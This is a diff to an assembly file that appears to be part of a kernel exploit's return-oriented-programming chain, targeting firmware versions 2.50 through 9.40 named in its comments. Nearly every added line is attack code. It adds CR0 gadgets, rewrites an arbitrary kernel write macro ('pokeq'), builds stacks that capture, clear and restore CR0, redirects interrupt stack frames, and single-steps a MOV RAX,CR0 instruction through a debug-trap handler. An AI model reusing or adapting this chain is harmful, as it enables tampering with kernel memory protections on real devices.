@@ -9,16 +9,22 @@ extern justreturn_pop
 extern wrmsr_ret
 extern pcpu
 extern mov_rax_cr3
+extern mov_rax_cr0
 extern mov_cr3_rax_mov_ds
 extern nop_ret
 extern pop_all_iret
 extern push_pop_all_iret
 extern rep_movsb_pop_rbp_ret
+extern store_rax_rdi
 extern uelf_cr3
 extern uelf_entry
 extern ist_errc
 extern ist_noerrc
 extern comparison_table
+extern cr0_capture
+extern cr0_load
+extern cr0_clear_store
+extern cr0_write_ret
 
 global _start
 
@@ -64,21 +70,36 @@ dq (%2) ; data to be copied, also popped into rbp
 ; pokeq where, value
 %macro pokeq 2
 dq pop_all_iret
-; set argument
+; Load the destination and value, then use the firmware-selected scalar store.
+; The continuation slot supports both "ret" and "pop rbp; ret" epilogues.
 times iret_rdi db 0
 dq (%1)
-times iret_rsi-iret_rdi-8 db 0
-dq %%stack_after
-times iret_rcx-iret_rsi-8 db 0
-dq 8
-times iret_rip-iret_rcx-8 db 0
-dq rep_movsb_pop_rbp_ret
+times iret_rax-iret_rdi-8 db 0
+dq (%2)
+times iret_rip-iret_rax-8 db 0
+dq store_rax_rdi ; mov [rdi], rax; [pop rbp;] ret
 dq 0x20
 dq 2
 dq %%stack_after
 dq 0
 %%stack_after:
-dq (%2) ; data to be copied, also popped into rbp
+dq nop_ret ; executed by ret, or consumed as rbp by pop rbp; ret
+%endmacro
+
+; Switch back to the UELF address space and resume the suspended yield().
+; This is instantiated for both CR0 stacks so neither path needs a stack-pivot
+; gadget whose offset and epilogue would add another firmware dependency.
+%macro return_to_uelf 0
+pokeq ist_noerrc, ist_after_write_cr3
+dq justreturn_pop
+dq 0
+dq 0
+dq uelf_cr3
+dq mov_cr3_rax_mov_ds
+dq 0x20
+dq 0x102
+dq 0
+dq 0
 %endmacro
 
 ; cmpb ptr1, ptr2, is_less, is_equal, is_greater
@@ -427,6 +448,7 @@ times iret_rip-(ist_after_userspace-errc_after_userspace) db 0
 dq nop_ret
 dq 0x20
 dq 2
+ist_after_userspace_rsp:
 dq after_userspace
 dq 0
 after_userspace:
@@ -452,6 +474,7 @@ times iret_rip-(ist_after_restore_cr3-iret_frame_after_restore_cr3) db 0
 dq nop_ret
 dq 0x20
 dq 2
+ist_after_restore_cr3_rsp:
 dq return_to_caller
 dq 0
 
@@ -480,8 +503,121 @@ dq pop_all_iret
 regs_for_exit:
 times iret_rip+40 db 0
 
+; UELF treats the trap number as regs[NREGS].  Keep these legacy fields
+; directly after the architectural frame; moving them breaks every
+; RUN_GADGET_RESULT_FULL_WITH_TRAP caller, including the 2.50 fallback.
 intno:
 dq 0
 
 justreturn_bak:
 times 5 dq 0
+
+; UELF learns the address of the final-HLT RSP slot through the trap frame;
+; this keeps KELF-private symbol addresses out of the separately loaded UELF.
+times fpu_cr0_exit_hook_ptr_offset-($-regs_for_exit) db 0
+fpu_cr0_exit_hook_ptr:
+dq ist_after_userspace_rsp
+times fpu_cr0_enter_hook_ptr_offset-($-regs_for_exit) db 0
+fpu_cr0_enter_hook_ptr:
+dq ist_after_restore_cr3_rsp
+
+; CR0 save/clear stack.  The padding slots normalize helpers which end in
+; either RET (2.50) or POP RBP; RET (4.03/7.61/9.40).
+times fpu_cr0_enter_stack_offset-($-regs_for_exit) db 0
+fpu_cr0_enter_stack:
+dq cr0_load
+dq nop_ret
+dq cr0_clear_store
+dq nop_ret
+dq cr0_write_ret
+dq nop_ret
+dq store_rax_rdi
+dq nop_ret
+return_to_uelf
+
+; Terminal CR0 restore stack.  uelf_fpu_finish() redirects only the final HLT
+; here, so an ordinary yield() after XRSTOR cannot terminate the UELF early.
+; Reset the hook before touching CR0, then load the deferred value through the
+; same firmware-specific helper already exercised by the enter chain.
+times fpu_cr0_exit_stack_offset-($-regs_for_exit) db 0
+fpu_cr0_exit_stack:
+pokeq ist_after_userspace_rsp, after_userspace
+dq pop_all_iret
+times iret_rdi db 0
+dq regs_for_exit+fpu_cr0_deferred_offset-0x58
+times iret_rip-iret_rdi-8 db 0
+dq cr0_load
+dq 0x20
+dq 2
+dq .after_cr0_load
+dq 0
+.after_cr0_load:
+dq nop_ret
+dq cr0_write_ret
+dq nop_ret
+dq doreti_iret
+dq nop_ret
+dq 0x20
+dq 2
+dq after_userspace
+dq 0
+
+; The capture helper writes its machine-state snapshot here.  The cleared CR0
+; is adjacent to the committed value, while the capture helper's fixed +0x58
+; output remains in the same compact result block.  UELF poisons and copies
+; this whole block at once so stale state cannot pass validation.
+times fpu_cr0_scratch_offset-($-regs_for_exit) db 0
+times 0x28 db 0
+
+; Place the one-shot #DB register stash so its RAX slot aliases the capture
+; helper's saved-CR0 slot at scratch+0x58.  This avoids a separate KELF memcpy;
+; the remaining saved registers land only in result padding and reserved space.
+fpu_cr0_regs_stash_after_read_cr0:
+times iret_rip db 0
+dq nop_ret
+dq 0x20
+dq 2
+dq fpu_cr0_after_read_cr0
+dq 0
+
+; Fast CR0 enter service.  UELF redirects the post-CR3 continuation here for
+; exactly one yield.  Reset that hook, single-step only MOV RAX,CR0, save its
+; result, then enter the same validated clear/write continuation used by the
+; generic cr0_capture fallback.  The dedicated #DB continuation avoids a
+; second KELF -> UELF -> KELF round trip.
+times fpu_cr0_fast_enter_stack_offset-($-regs_for_exit) db 0
+fpu_cr0_fast_enter_stack:
+pokeq ist_after_restore_cr3_rsp, return_to_caller
+pokeq ist_noerrc, .ist_after_read_cr0
+dq doreti_iret
+dq mov_rax_cr0
+dq 0x20
+dq 0x102
+dq 0
+dq 0
+
+align 16
+dq 0
+.iret_frame_after_read_cr0:
+times 5 dq 0
+.ist_after_read_cr0:
+times iret_rip-(.ist_after_read_cr0-.iret_frame_after_read_cr0) db 0
+dq push_pop_all_iret
+dq 0x20
+dq 2
+dq fpu_cr0_regs_stash_after_read_cr0+iret_rip
+dq 0
+
+fpu_cr0_after_read_cr0:
+pokeq ist_noerrc, noerrc_iret_frame+40
+dq pop_all_iret
+times iret_rdi db 0
+dq regs_for_exit+fpu_cr0_scratch_offset
+times iret_rsi-iret_rdi-8 db 0
+dq regs_for_exit+fpu_cr0_cleared_offset
+times iret_rip-iret_rsi-8 db 0
+dq cr0_load
+dq 0x20
+dq 2
+dq regs_for_exit+fpu_cr0_enter_stack_offset+8
+dq 0
